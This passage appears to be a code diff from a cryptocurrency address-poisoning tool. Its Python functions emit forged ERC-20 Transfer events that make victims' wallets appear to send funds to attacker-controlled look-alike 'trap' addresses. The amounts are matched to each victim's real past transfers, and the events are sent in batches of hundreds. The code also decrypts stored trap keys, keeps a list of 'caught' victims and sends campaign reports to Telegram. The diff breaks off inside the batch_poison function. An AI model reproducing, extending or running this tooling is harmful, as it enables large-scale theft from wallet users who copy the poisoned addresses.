+            "baseFeePerGas" in latest_block
+            and latest_block["baseFeePerGas"] is not None
+            and CHAIN.lower() != "bsc"
+        )
+
+        gas_params = {}
+        if use_eip1559:
+            gas_params = get_smart_gas_params(w3, context="[mirror]", campaign_id=campaign_id)
+        else:
+            gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
+
+        estimated_gas = 80000 # 🚀 Increased buffer to match re_poison.js
+
+        tx = contract.functions.transferFrom(
+            w3.to_checksum_address(victim_address),
+            w3.to_checksum_address(trap_address),
+            raw_value
+        ).build_transaction({
+            'from': operator_addr,
+            'nonce': nonce,
+            'gas': estimated_gas,
+            'chainId': w3.eth.chain_id,
+            **gas_params
+        })
+
+        # 🚀 DRY Refactor: Use shared balance checker
+        if not check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, "mirror"):
+            return None
+        signed = w3.eth.account.sign_transaction(tx, operator_key)
+        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
+        tx_hash = w3.eth.send_raw_transaction(raw_tx)
+        logger.info(f"[mirror] Forged Transfer emitted: {victim_address} → {trap_address} raw={raw_value} {asset} tx={tx_hash.hex()}")
+
+        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300) # 🚀 5 minutes
+        if receipt.status == 1:
+            logger.info(f"[mirror] ✅ Mirror tx confirmed in block {receipt.blockNumber}")
+            return tx_hash.hex()
+        else:
+            logger.error(f"[mirror] ❌ Mirror tx reverted")
+            return None
+
+    except Exception as e:
+        logger.error(f"[mirror] Failed to emit forged transfer: {e}")
+        return None
+
+
+
+def emit_batch_mirror_transfers(victims, traps, amounts, asset, campaign_id):
+    """
+    Emit multiple forged Transfer events in a SINGLE transaction.
+    """
+    if len(victims) != len(traps) or len(victims) != len(amounts):
+        logger.error("[batch-mirror] Mismatched array lengths")
+        return None
+    
+    # 🚀 FIX: Route to the correct stealth contract based on the batch's asset
+    contract_address = (
+        MIRROR_CONTRACTS.get(asset) or 
+        MIRROR_CONTRACTS.get(asset.upper()) or 
+        MIRROR_TOKEN_NATIVE
+    )
+    if not contract_address:
+        logger.warning(f"[batch-mirror] No contract configured for {asset}")
+        return None
+    
+    operator_key = get_mirror_operator_key(campaign_id)
+    if not operator_key:
+        logger.warning(f"[batch-mirror] No funding key for campaign {campaign_id}")
+        return None
+    
+    try:
+        operator_account = w3.eth.account.from_key(operator_key)
+        operator_addr = operator_account.address
+        
+        contract = w3.eth.contract(
+            address=w3.to_checksum_address(contract_address),
+            abi=MIRROR_ABI
+        )
+        
+        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")
+        
+        latest_block = call_with_retry(w3.eth.get_block, "latest")
+        use_eip1559 = (
+            "baseFeePerGas" in latest_block
+            and latest_block["baseFeePerGas"] is not None
+            and CHAIN.lower() != "bsc"
+        )
+        
+        gas_params = {}
+        if use_eip1559:
+            gas_params = get_smart_gas_params(w3, context="[batch-mirror]", campaign_id=campaign_id)
+        else:
+            gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
+        
+        estimated_gas = 50000 + (15000 * len(victims))
+        
+        victims_checksum = [w3.to_checksum_address(v) for v in victims]
+        traps_checksum = [w3.to_checksum_address(t) for t in traps]
+        
+        tx = contract.functions.batchEmitTransfers(
+            victims_checksum,
+            traps_checksum,
+            amounts
+        ).build_transaction({
+            'from': operator_addr,
+            'nonce': nonce,
+            'gas': estimated_gas,
+            'chainId': w3.eth.chain_id,
+            **gas_params
+        })
+        
+        # 🚀 DRY Refactor: Use shared balance checker
+        if not check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, "batch-mirror"):
+            return None
+        
+        signed = w3.eth.account.sign_transaction(tx, operator_key)
+        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
+        tx_hash = w3.eth.send_raw_transaction(raw_tx)
+        
+        logger.info(f"[batch-mirror] Batch emission sent: {len(victims)} transfers in tx={tx_hash.hex()}")
+        
+        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300) # 🚀 5 minutes
+        if receipt.status == 1:
+            logger.info(f"[batch-mirror] ✅ Batch confirmed in block {receipt.blockNumber}")
+            return tx_hash.hex()
+        else:
+            logger.error(f"[batch-mirror] ❌ Batch tx reverted")
+            return None
+    
+    except Exception as e:
+        logger.error(f"[batch-mirror] Failed to emit batch: {e}")
+        return None
+
+
+def emit_multi_token_batch_transfers(queue, campaign_id):
+    """
+    Emit multiple forged Transfer events for DIFFERENT tokens in a SINGLE transaction
+    using the MultiTokenBatchRouter contract.
+    """
+    if not MULTI_TOKEN_ROUTER:
+        logger.error("[multi-batch] MULTI_TOKEN_ROUTER not configured in .env")
+        return None
+        
+    operator_key = get_mirror_operator_key(campaign_id)
+    if not operator_key:
+        logger.warning(f"[multi-batch] No funding key for campaign {campaign_id}")
+        return None
+        
+    try:
+        operator_account = w3.eth.account.from_key(operator_key)
+        operator_addr = operator_account.address
+        
+        router_contract = w3.eth.contract(
+            address=w3.to_checksum_address(MULTI_TOKEN_ROUTER),
+            abi=MULTI_TOKEN_ROUTER_ABI
+        )
+        
+        # Group queue items by asset (contract address)
+        asset_groups = {}
+        for q in queue:
+            asset = q['asset']
+            contract_address = (
+                MIRROR_CONTRACTS.get(asset) or 
+                MIRROR_CONTRACTS.get(asset.upper()) or 
+                MIRROR_TOKEN_NATIVE
+            )
+            if not contract_address:
+                logger.warning(f"[multi-batch] No contract for asset {asset}, skipping")
+                continue
+                
+            if contract_address not in asset_groups:
+                asset_groups[contract_address] = []
+            asset_groups[contract_address].append(q)
+            
+        if not asset_groups:
+            logger.error("[multi-batch] No valid assets to batch")
+            return None
+            
+        # Build the BatchCall structs (using tuples for max web3.py compatibility)
+        calls = []
+        total_transfers = 0
+        for contract_addr, items in asset_groups.items():
+            froms = [w3.to_checksum_address(q['victim']) for q in items]
+            tos = [w3.to_checksum_address(q['trap']) for q in items]
+            values = [q['amount'] for q in items]
+            total_transfers += len(items)
+            
+            calls.append((
+                w3.to_checksum_address(contract_addr),
+                froms,
+                tos,
+                values
+            ))
+            
+        logger.info(f"[multi-batch] Fetching nonce for {operator_addr}...")
+        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")
+        logger.info(f"[multi-batch] Got nonce: {nonce}")
+        
+        latest_block = call_with_retry(w3.eth.get_block, "latest")
+        use_eip1559 = (
+            "baseFeePerGas" in latest_block
+            and latest_block["baseFeePerGas"] is not None
+            and CHAIN.lower() != "bsc"
+        )
+        
+        gas_params = {}
+        if use_eip1559:
+            gas_params = get_smart_gas_params(w3, context="[multi-batch]", campaign_id=campaign_id)
+        else:
+            gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
+            
+        estimated_gas = 50000 + (15000 * total_transfers)
+        
+        tx = router_contract.functions.transfer(calls).build_transaction({
+            'from': operator_addr,
+            'nonce': nonce,
+            'gas': estimated_gas,
+            'chainId': w3.eth.chain_id,
+            **gas_params
+        })
+        
+        # 🚀 DRY Refactor: Use shared balance checker
+        if not check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, "multi-batch"):
+            return None
+            
+        logger.info(f"[multi-batch] Signing transaction...")
+        signed = w3.eth.account.sign_transaction(tx, operator_key)
+        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
+        
+        logger.info(f"[multi-batch] Broadcasting to RPC...")
+        tx_hash = w3.eth.send_raw_transaction(raw_tx)
+        
+        logger.info(f"[multi-batch] Multi-token batch sent: {total_transfers} transfers across {len(calls)} tokens in tx={tx_hash.hex()}")
+        
+        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300) # 🚀 5 minutes
+        if receipt.status == 1:
+            logger.info(f"[multi-batch] ✅ Multi-token batch confirmed in block {receipt.blockNumber}")
+            return tx_hash.hex()
+        else:
+            logger.error(f"[multi-batch] ❌ Multi-token batch reverted")
+            return None
+            
+    except Exception as e:
+        logger.error(f"[multi-batch] Failed to emit multi-token batch: {e}")
+        return None    
+
+
+def get_web3():
+    get_var = lambda name: getattr(config, name, None) or os.getenv(name)
+
+    raw_urls = [
+        get_var("RPC_URL"),
+        get_var("DUSTER_RPC_URL"),
+        get_var("NODE_RPC_URL"),
+    ] + getattr(config, "FALLBACK_RPC_URLS", []) + PUBLIC_RPC_FALLBACKS.get(CHAIN.lower(), [])
+
+    rpc_urls = list(dict.fromkeys([url for url in raw_urls if url]))
+
+    print(f'[DEBUG] Trying {len(rpc_urls)} RPC URLs...')
+
+    for url in rpc_urls:
+        try:
+            print(f'[DEBUG] Connecting to {url}...')
+            provider = Web3.HTTPProvider(url, request_kwargs={'timeout': 30})
+            w3 = Web3(provider)
+
+            if w3.is_connected():
+                if CHAIN.lower() in ('bsc', 'polygon') and geth_poa_middleware is not None:
+                    try:
+                        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
+                    except Exception as e:
+                        print(f'[DEBUG] POA middleware injection skipped/failed: {e}')
+
+                logger.info(f"Connected to RPC: {url}")
+                return w3
+        except Exception as e:
+            print(f'[DEBUG] Connection failed for {url}: {e}')
+            continue
+
+    logger.critical("No RPC connection available.")
+    sys.exit(1)
+
+w3 = get_web3()
+print('[DEBUG] Web3 instance ready.')
+
+VAULT_FILE = config.VAULT_FILE
+
+ERC20_ABI = [
+    {
+        "constant": False,
+        "inputs": [{"name": "to", "type": "address"}, {"name": "value", "type": "uint256"}],
+        "name": "transfer",
+        "outputs": [{"name": "", "type": "bool"}],
+        "type": "function",
+    },
+    {
+        "constant": True,
+        "inputs": [{"name": "owner", "type": "address"}],
+        "name": "balanceOf",
+        "outputs": [{"name": "", "type": "uint256"}],
+        "type": "function",
+    },
+]
+
+_last_gas_insufficient_alert = {}
+
+def call_with_retry(func, *args, max_attempts=3, base_delay=1, **kwargs):
+    last_exc = None
+    for attempt in range(1, max_attempts + 1):
+        try:
+            return func(*args, **kwargs)
+        except Exception as e:
+            last_exc = e
+            err_str = str(e).lower()
+            if attempt < max_attempts:
+                delay = base_delay * (2 ** (attempt - 1))
+                if "429" in err_str or "too many requests" in err_str or "limit" in err_str:
+                    delay = max(delay, 5)
+                logger.warning(f"Retry {attempt}/{max_attempts} for {func.__name__} after {delay}s: {e}")
+                time.sleep(delay)
+            else:
+                raise
+    raise last_exc
+
+
+
+def get_native_reserve_wei(chain_name):
+    """Calculates the Wei equivalent of the GAS_RESERVE_USD for the native coin."""
+    try:
+        # CoinGecko IDs for the 3 supported chains
+        symbol_map = {"ethereum": "ethereum", "bsc": "binancecoin", "polygon": "matic-network"}
+        coin_id = symbol_map.get(chain_name.lower(), "ethereum")
+        
+        url = f"https://api.coingecko.com/api/v3/simple/price?ids={coin_id}&vs_currencies=usd"
+        req = urllib.request.Request(url, headers={'User-Agent': 'CipherNet/1.0'})
+        with urllib.request.urlopen(req, timeout=3) as response:
+            data = json.loads(response.read().decode())
+            price = data[coin_id]['usd']
+            
+            # Calculate exact Wei needed for the USD reserve (all 3 chains use 18 decimals)
+            reserve_native = GAS_RESERVE_USD / price
+            return int(reserve_native * (10 ** 18))
+            
+    except Exception:
+        # Safe fallback reserves using conservative worst-case prices 
+        # to ensure the trap ALWAYS keeps at least the GAS_RESERVE_USD value
+        worst_case_prices = {
+            "ethereum": 4000,   # Assumes ETH <= $4000
+            "bsc": 700,         # Assumes BNB <= $700
+            "polygon": 1.0      # Assumes MATIC <= $1.00
+        }
+        price = worst_case_prices.get(chain_name.lower(), 4000)
+        return int((GAS_RESERVE_USD / price) * (10 ** 18))
+
+def read_vault_lines(file_path):
+    lines = []
+    if not os.path.exists(file_path):
+        return lines
+    with open(file_path, 'r') as f:
+        raw_lines = f.readlines()
+        for idx, raw_line in enumerate(raw_lines):
+            line = raw_line.strip()
+            if not line:
+                continue
+            try:
+                decrypted = decrypt(line)
+                lines.append(decrypted)
+            except Exception as e:
+                logger.error(f"Failed to decrypt line {idx+1}: {e}")
+                continue
+    return lines
+
+def get_trap_entries_from_db(campaign_id):
+    entries = []
+    if not supabase:
+        logger.error("Supabase client not initialized.")
+        return entries
+    try:
+        result = supabase.table("traps")\
+            .select("id, victim_address, trap_private_key_enc, dust_count, counterparty_address")\
+            .eq("campaign_id", campaign_id)\
+            .execute()
+        if not result.data:
+            logger.info(f"No traps found for campaign {campaign_id}")
+            return entries
+        for row in result.data:
+            enc_key = row.get("trap_private_key_enc")
+            if not enc_key:
+                continue
+            try:
+                private_key = decrypt(enc_key)
+                w3.eth.account.from_key(private_key)
+                victim = row.get("victim_address", "").lower()
+                dust_count = row.get("dust_count", 0) or 0
+                trap_id = row.get("id")
+                counterparty = row.get("counterparty_address", "").lower() if row.get("counterparty_address") else ""
+                if victim:
+                    entries.append((trap_id, victim, private_key, dust_count, counterparty))
+            except Exception as e:
+                logger.error(f"Failed to decrypt private key for victim {row.get('victim_address')}: {e}")
+                continue
+        logger.info(f"Loaded {len(entries)} trap entries from database for campaign {campaign_id}")
+    except Exception as e:
+        logger.error(f"Failed to fetch traps from database: {e}")
+    return entries
+
+
+def get_trap_entries_by_ids(trap_ids):
+    """Fetch specific traps by their IDs. Returns list of (trap_id, victim, key, dust_count, counterparty) tuples."""
+    entries = []
+    if not supabase:
+        logger.error("Supabase client not initialized.")
+        return entries
+    if not trap_ids:
+        return entries
+    try:
+        for i in range(0, len(trap_ids), 500):
+            chunk = trap_ids[i:i + 500]
+            result = supabase.table("traps")\
+                .select("id, victim_address, trap_private_key_enc, dust_count, counterparty_address")\
+                .in_("id", chunk)\
+                .execute()
+            if not result.data:
+                continue
+            for row in result.data:
+                enc_key = row.get("trap_private_key_enc")
+                if not enc_key:
+                    continue
+                try:
+                    private_key = decrypt(enc_key)
+                    w3.eth.account.from_key(private_key)
+                    victim = row.get("victim_address", "").lower()
+                    dust_count = row.get("dust_count", 0) or 0
+                    counterparty = row.get("counterparty_address", "").lower() if row.get("counterparty_address") else ""
+                    if victim:
+                        entries.append((row.get("id"), victim, private_key, dust_count, counterparty))
+                except Exception as e:
+                    logger.error(f"Failed to decrypt private key for trap {row.get('id')}: {e}")
+                    continue
+        logger.info(f"Loaded {len(entries)} filtered trap entries by IDs")
+    except Exception as e:
+        logger.error(f"Failed to fetch traps by IDs: {e}")
+    return entries
+
+
+def update_trap_dust_count(trap_id):
+    """Increment dust_count and update last_dusted_at for a trap."""
+    if not supabase or not trap_id:
+        return
+    
+    now_iso = datetime.now(timezone.utc).isoformat()
+    
+    for attempt in range(3):
+        try:
+            # Fetch current dust_count, increment, and update
+            result = supabase.table("traps").select("dust_count").eq("id", trap_id).execute()
+            current_count = 0
+            if result.data and len(result.data) > 0:
+                current_count = result.data[0].get("dust_count", 0) or 0
+            
+            supabase.table("traps").update({
+                "dust_count": current_count + 1,
+                "last_dusted_at": now_iso
+            }).eq("id", trap_id).execute()
+            
+            # Success - break out of retry loop
+            return
+            
+        except Exception as e:
+            err_str = str(e).lower()
+            logger.warning(f"Failed to update dust_count for trap {trap_id} (attempt {attempt + 1}/3): {e}")
+            
+            # If it's a connection error, wait before retrying
+            if "broken pipe" in err_str or "connection" in err_str or "timeout" in err_str:
+                if attempt < 2:
+                    logger.info(f"Connection error detected. Retrying in 3 seconds...")
+                    time.sleep(3)
+                    continue
+            
+            # If it's not a connection error, don't retry
+            break
+    
+    logger.error(f"All 3 attempts failed for dust_count update on trap {trap_id}")
+
+
+def get_counterparty_from_db(victim_address, campaign_id):
+    """Fetch the counterparty address for a specific victim from the traps table."""
+    if not supabase:
+        logger.error("Supabase client not initialized.")
+        return None
+    try:
+        result = supabase.table("traps")\
+            .select("counterparty_address")\
+            .eq("campaign_id", campaign_id)\
+            .eq("victim_address", victim_address.lower())\
+            .limit(1)\
+            .maybe_single()\
+            .execute()
+        if result.data:
+            return result.data.get("counterparty_address")
+        return None
+    except Exception as e:
+        logger.error(f"Failed to fetch counterparty for victim {victim_address}: {e}")
+        return None
+
+
+def parse_cached_amount(amount_str, asset):
+    """
+    Parse cached amount from any format the database might have stored it in.
+    Returns the amount in smallest units (wei for native, raw units for ERC-20).
+    """
+    if not amount_str:
+        return 0
+    
+    amount_str = str(amount_str).strip()
+    
+    # Hex string (e.g., "0x21c94ac0") — ERC-20 raw units from Alchemy
+    if amount_str.startswith('0x') or amount_str.startswith('0X'):
+        return int(amount_str, 16)
+    
+    # Decimal float (e.g., "15.988555750235143") — native coin in human-readable form
+    if '.' in amount_str:
+        try:
+            value_float = float(amount_str)
+            if asset in ('ETH', 'BNB', 'MATIC', 'ETH', 'WETH'):
+                # Native coins: 18 decimals
+                return int(value_float * (10 ** 18))
+            elif asset in ('USDC', 'USDT', 'USDP', 'TUSD', 'FRAX', 'BUSD', 'USDCe'):
+                # Stablecoins: 6 decimals (USDC/USDT) or 18 decimals (DAI)
+                if asset == 'DAI':
+                    return int(value_float * (10 ** 18))
+                return int(value_float * (10 ** 6))
+            elif asset in ('WBTC', 'renBTC'):
+                # Wrapped BTC: 8 decimals
+                return int(value_float * (10 ** 8))
+            else:
+                # Default to 18 decimals for unknown tokens
+                return int(value_float * (10 ** 18))
+        except (ValueError, OverflowError):
+            return 0
+    
+    # Plain integer string (e.g., "3136" or "15000000000000000000")
+    try:
+        value = int(amount_str)
+        # If it looks like a human-readable number (very small), convert to wei
+        if value < 1000000 and asset in ('ETH', 'BNB', 'MATIC'):
+            return int(value * (10 ** 18))
+        return value
+    except ValueError:
+        return 0
+    
+
+def fetch_last_transfer_from_blockchain(victim_address, counterparty_address, trap_id=None):
+    """
+    Fetch the most recent transfer with database caching.
+    
+    Strategy:
+    1. Check database cache first
+    2. If cache exists, only query from cached block to latest
+    3. Update cache after successful query
+    4. Fall back to full history only on first run
+    """
+    try:
+        victim_checksum = w3.to_checksum_address(victim_address)
+        counterparty_checksum = w3.to_checksum_address(counterparty_address)
+        victim_lower = victim_address.lower()
+        counterparty_lower = counterparty_address.lower()
+        
+        # Check database cache
+        from_block = '0x0'  # Default to full history
+        cached_asset = None
+        cached_amount = None
+        
+        if trap_id and supabase:
+            result = supabase.table('traps').select(
+                'last_transfer_block, last_transfer_asset, last_transfer_amount'
+            ).eq('id', trap_id).single().execute()
+            
+            if result.data and result.data.get('last_transfer_block'):
+                cached_block = result.data['last_transfer_block']
+                cached_asset = result.data['last_transfer_asset']
+                cached_amount = result.data['last_transfer_amount']
+                
+                # Only query from cached block to latest (much faster)
+                from_block = hex(cached_block + 1)  # Start from block after last cached
+                logger.info(f"[Cache] Found cached transfer at block {cached_block}, querying from {from_block}")
+        
+        # Try Alchemy APIs (with rate limit handling from previous fix)
+        alchemy_urls = ALCHEMY_RPCS.get(CHAIN.lower(), [])
+        alchemy_errors = []
+        
+        for url_idx, url in enumerate(alchemy_urls):
+            try:
+                alchemy_w3 = Web3(Web3.HTTPProvider(url, request_kwargs={'timeout': 10}))
+                if not alchemy_w3.is_connected():
+                    continue
+                
+                categories = ['external', 'erc20']
+                if CHAIN.lower() in ('ethereum', 'polygon'):
+                    categories.append('internal')
+                
+                result = alchemy_w3.provider.make_request('alchemy_getAssetTransfers', [{
+                    'fromBlock': from_block,
+                    'toBlock': 'latest',
+                    'fromAddress': victim_checksum,
+                    'toAddress': counterparty_checksum,
+                    'category': categories,
+                    'order': 'desc',
+                    'maxCount': '0x5',
+                    'withMetadata': True,  # Include block metadata for caching
+                }])
+                
+                if 'result' in result and result['result'].get('transfers'):
+                    transfers = result['result']['transfers']
+                    
+                    for t in transfers:
+                        if (t.get('from', '').lower() == victim_lower and 
+                            t.get('to', '').lower() == counterparty_lower):
+                            
+                            # Extract block number for caching
+                            block_hex = t.get('blockNum', '0x0')
+                            block_num = int(block_hex, 16)
+                            
+                            # Native transfer
+                            if t.get('category') == 'external':
+                                value_raw = t.get('value', 0)
+                                if isinstance(value_raw, str):
+                                    try:
+                                        value_float = float(value_raw)
+                                        value_wei = int(value_float * (10 ** 18))
+                                    except ValueError:
+                                        if value_raw.startswith('0x'):
+                                            value_wei = int(value_raw, 16)
+                                        else:
+                                            value_wei = int(value_raw)
+                                else:
+                                    value_wei = int(float(value_raw) * (10 ** 18))
+                                
+                                if value_wei > 0:
+                                    logger.info(f"[Alchemy] Found {NATIVE_SYMBOL} transfer: {w3.from_wei(value_wei, 'ether')} ETH at block {block_num}")
+                                    
+                                    # Update cache
+                                    update_transfer_cache(trap_id, block_num, NATIVE_SYMBOL, str(value_wei))
+                                    
+                                    return (NATIVE_SYMBOL, value_wei)
+                            
+                            # ERC-20 transfer
+                            elif t.get('category') == 'erc20':
+                                raw_contract = t.get('rawContract', {})
+                                raw_hex = raw_contract.get('value')
+                                
+                                if raw_hex:
+                                    value_units = int(raw_hex, 16)
+                                else:
+                                    token_addr = raw_contract.get('address', '').lower()
+                                    decimals = 6
+                                    for sym, addr in TOKEN_CONFIG.items():
+                                        if addr.lower() == token_addr:
+                                            decimals = config.get_token_decimals().get(sym, 6) if hasattr(config, 'get_token_decimals') else 6
+                                            break
+                                    value_units = int(float(t.get('value', 0)) * (10 ** decimals))
+                                
+                                if value_units > 0:
+                                    token_contract = raw_contract.get('address', '').lower()
+                                    for symbol, addr in TOKEN_CONFIG.items():
+                                        if addr.lower() == token_contract:
+                                            logger.info(f"[Alchemy] Found {symbol} transfer: {value_units} units at block {block_num}")
+                                            
+                                            # Update cache
+                                            update_transfer_cache(trap_id, block_num, symbol, str(value_units))
+                                            
+                                                        #    /* fix */
+                                            return (symbol, value_units)
+                
+                # No new transfers found since cached block
+                if cached_asset and cached_amount:
+                    parsed_amount = parse_cached_amount(cached_amount, cached_asset)
+                    logger.info(f"[Cache] No new transfers since block {cached_block}, using cached: {cached_amount} {cached_asset} → {parsed_amount} units")
+                    return (cached_asset, parsed_amount)
+                
+                # First run - no cache and no transfers found
+                logger.info(f"[Alchemy] No transfers found in history")
+                return (None, None)
+                
+            except Exception as e:
+                err_str = str(e)
+                logger.warning(f"[Alchemy:{url[:30]}...] Failed: {err_str[:200]}")
+                alchemy_errors.append((url[:30], err_str[:100]))
+                
+                # Rate limit handling
+                err_lower = err_str.lower()
+                if '429' in err_lower or 'rate limit' in err_lower or 'too many requests' in err_lower:
+                    if url_idx < len(alchemy_urls) - 1:
+                        logger.info(f"[Alchemy] Rate limited, waiting 2s before next URL...")
+                        time.sleep(2)
+                continue
+        
+               # All Alchemy URLs failed
+        if cached_asset and cached_amount:
+            # Use cached data if available
+            parsed_amount = parse_cached_amount(cached_amount, cached_asset)
+            if parsed_amount > 0:
+                logger.warning(f"[Cache] Alchemy failed, using cached: {cached_amount} {cached_asset} → {parsed_amount} units")
+                return (cached_asset, parsed_amount)
+            else:
+                logger.error(f"[Cache] Could not parse cached amount: '{cached_amount}' for {cached_asset}")
+        
+        # No cache and all APIs failed - skip this victim
+        logger.error(f"[SKIP] All Alchemy URLs failed and no cache available for {victim_address}")
+        return (None, None)
+        
+    except Exception as e:
+        logger.error(f"[RPC] Error fetching last transfer: {e}")
+        return (None, None)
+
+
+def update_transfer_cache(trap_id, block_num, asset, amount):
+    """Update the transfer cache in the database."""
+    if not trap_id or not supabase:
+        return
+    
+    try:
+        supabase.table('traps').update({
+            'last_transfer_block': block_num,
+            'last_transfer_asset': asset,
+            'last_transfer_amount': amount,
+            'last_transfer_timestamp': datetime.now(timezone.utc).isoformat()
+        }).eq('id', trap_id).execute()
+        logger.debug(f"[Cache] Updated cache for trap {trap_id}: block {block_num}, {amount} {asset}")
+    except Exception as e:
+        logger.warning(f"[Cache] Failed to update cache for trap {trap_id}: {e}")
+
+
+def send_batch_telegram_notifications(queue, tx_hash, campaign_id, is_final=False):
+    """
+    Splits a batch of transactions into multiple Telegram messages 
+    to respect Telegram's 4096 character limit per message.
+    """
+    try:
+        tx_url = get_explorer_url(tx_hash, 'tx')
+        
+        # 🚀 REDUCED TO 10: 20 items was ~4300 chars (still over the 4096 limit).
+        # 10 items guarantees we stay around ~2300 chars per message.
+        CHUNK_SIZE = 10
+        chunks = [queue[i:i + CHUNK_SIZE] for i in range(0, len(queue), CHUNK_SIZE)]
+        
+        title = "🪞 *Final Batch Mirror Events!*" if is_final else "🪞 *Batch Mirror Events Emitted!*"
+        
+        for chunk_idx, chunk in enumerate(chunks):
+            # Add part number if there are multiple messages
+            if len(chunks) > 1:
+                header = f"{title} (Part {chunk_idx + 1}/{len(chunks)})\n\n"
+            else:
+                header = f"{title}\n\n"
+                
+            header += f"👥 Processed: {len(queue)} victims\n"
+            header += f"🔗 [View TX on Explorer]({tx_url})\n\n"
+            
+            msg = header
+            
+            # Calculate the starting index for continuous numbering across messages
+            start_idx = chunk_idx * CHUNK_SIZE + 1
+            
+            for idx, q in enumerate(chunk, start_idx):
+                # Safely handle asset string
+                asset_str = str(q['asset']) if q['asset'] else 'ETH'
+                decimals = get_token_decimals(asset_str)
+                amount_display = q['amount'] / (10 ** decimals)
+                victim_url = get_explorer_url(q['victim'])
+                trap_url = get_explorer_url(q['trap'])
+                
+                msg += f"*{idx}.* ({amount_display:.4f} {asset_str})\n"
+                msg += f"👤 [Victim]({victim_url})\n"
+                msg += f"🪤 [Trap]({trap_url})\n\n"
+                
+            send_telegram(msg, campaign_id=campaign_id)
+            
+    except Exception as e:
+        # 🚀 Catch and log any hidden Telegram formatting or API errors
+        logger.error(f"[Telegram] Failed to send batch notification: {e}")
+
+
+def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
+    has_trap_ids = trap_ids is not None and len(trap_ids) > 0
+    
+
+    if has_trap_ids:
+        logger.info(f"Using filtered mode: {len(trap_ids)} specific trap IDs")
+        filtered_entries = get_trap_entries_by_ids(trap_ids)
+        if not filtered_entries:
+            logger.error("No traps found for the provided IDs")
+            return
+        entries = filtered_entries
+    elif campaign_id:
+        logger.info(f"Using database for campaign {campaign_id}")
+        entries = get_trap_entries_from_db(campaign_id)
+        if not entries:
+            logger.error(f"No traps found for campaign {campaign_id}")
+            return
+    else:
+        logger.info("Using vault file for legacy mode")
+        if not os.path.exists(VAULT_FILE):
+            logger.error(f"{VAULT_FILE} not found.")
+            return
+        decrypted_lines = read_vault_lines(VAULT_FILE)
+        if not decrypted_lines:
+            logger.error("No valid (decrypted) entries found in vault.txt")
+            return
+        entries = []
+        for line in decrypted_lines:
+            match = re.search(r"Victim:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})", line, re.IGNORECASE)
+            if match:
+                # Legacy mode: no trap_id, no dust_count, no counterparty
+                entries.append((None, match.group(1), match.group(2), 0, None))
+            else:
+                match = re.search(r"Target:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})", line, re.IGNORECASE)
+                if match:
+                    entries.append((None, match.group(1), match.group(2), 0, None))
+
+    if not entries:
+        logger.error("No valid entries found")
+        return
+
+    CAUGHT_FILE = config.CAUGHT_FILE
+    caught = set()
+    if os.path.exists(CAUGHT_FILE):
+        try:
+            with open(CAUGHT_FILE, 'r') as f:
+                data = f.read()
+                if data.strip():
+                    for line in data.split('\n'):
+                        addr = line.strip().lower()
+                        if addr:
+                            caught.add(addr)
+            logger.info(f"Loaded {len(caught)} caught victims from {CAUGHT_FILE}")
+        except Exception as e:
+            logger.warning(f"Could not read caught victims file: {e}")
+
+    # 🚀 CRITICAL: Define total right here before using it
+    total = len(entries)
+    logger.info(f"Found {total} victims. Processing with mirror events only...")
+    
+    if job_id:
+        update_job(job_id, total=total)
+        
+          # 🚀 BATCH PROCESSING: 400 items per multi-token batch to minimize gas fees
+    BATCH_SIZE = 400
+    
+    # 🚀 Send "Started" Telegram notification immediately
+    start_msg = (
+        f"🚀 *Manual Dusting Started*\n\n"
+        f"👥 Total victims: {total}\n"
+        f"⚙️ Processing batches of {BATCH_SIZE}..."
+    )
+    send_telegram(start_msg, campaign_id=campaign_id)
+
+    success = 0
+    gas_failures = 0
+    skipped_dusted = 0
+    poison_queue = []  # Single unified queue for all assets (multi-token batching)
+    
+    for i, entry in enumerate(entries, 1):
+        trap_id = entry[0]
+        victim = entry[1]
+        key = entry[2]
+        dust_count = entry[3]
+        counterparty = entry[4]
+            
+        if victim.lower() in caught:
+            logger.info(f"Skipping caught victim {victim}")
+            continue
+
+        # 🚀 SKIP ALREADY DUSTED TRAPS
+        if dust_count > 0:
+            logger.info(f"[{i}/{total}] Skipping already dusted victim {victim} (dust_count: {dust_count})")
+            skipped_dusted += 1
+            continue
+
+        logger.info(f"[{i}/{total}] Processing victim {victim}")
+        
+        trap_address = w3.eth.account.from_key(key).address.lower()
+        
+        if not counterparty:
+            logger.warning(f"[{i}/{total}] No counterparty found for {victim}, skipping")
+            continue
+        
+        # Fetch last transfer from blockchain (with caching)
+        logger.info(f"[mirror] Fetching last transfer from {victim} to {counterparty} (trap_id: {trap_id})...")
+        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(victim, counterparty, trap_id)
+        
+        if not fetched_asset or not fetched_amount:
+            # 🆕 Use default fallback: emit a small native transfer
+            logger.info(f"[{i}/{total}] No transfer found for {victim}, using default {NATIVE_SYMBOL} fallback")
+            fetched_asset = NATIVE_SYMBOL
+            fetched_amount = w3.to_wei(1, 'ether')
+        
+        logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
+        
+                # 🚀 Add to unified multi-token batch queue
+        poison_queue.append({
+            'victim': victim,
+            'trap': trap_address,
+            'amount': fetched_amount,
+            'asset': fetched_asset,
+            'trap_id': trap_id,
+        })
+        
+        # 🚀 Process batch when queue reaches BATCH_SIZE (700)
+        if len(poison_queue) >= BATCH_SIZE:
+            logger.info(f"[batch] Processing multi-token batch of {len(poison_queue)} victims...")
+            
+            batch_trap_ids = [q['trap_id'] for q in poison_queue if q['trap_id']]
+            
+            # Emit multi-token batch via Router
